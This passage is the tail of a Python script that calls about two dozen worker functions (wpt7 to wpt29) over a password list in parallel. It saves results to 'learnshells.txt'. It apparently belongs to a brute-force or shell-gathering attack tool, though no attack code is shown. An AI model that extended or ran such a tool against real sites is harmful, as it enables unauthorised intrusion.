pool.map(wpt7, ListPass)
pool.map(wpt8, ListPass)
pool.map(wpt9, ListPass)
pool.map(wpt10, ListPass)
pool.map(wpt11, ListPass)
pool.map(wpt12, ListPass)
pool.map(wpt13, ListPass)
pool.map(wpt14, ListPass)
pool.map(wpt15, ListPass)
pool.map(wpt16, ListPass)
pool.map(wpt17, ListPass)
pool.map(wpt18, ListPass)
pool.map(wpt19, ListPass)
pool.map(wpt20, ListPass)
pool.map(wpt21, ListPass)
pool.map(wpt22, ListPass)
pool.map(wpt23, ListPass)
pool.map(wpt24, ListPass)
pool.map(wpt25, ListPass)
pool.map(wpt26, ListPass)
pool.map(wpt27, ListPass)
pool.map(wpt28, ListPass)
pool.map(wpt29, ListPass)
pool.close()
pool.join()

if __name__ == '__main__':		
	print("Finished, success   saved to : learnshells.txt")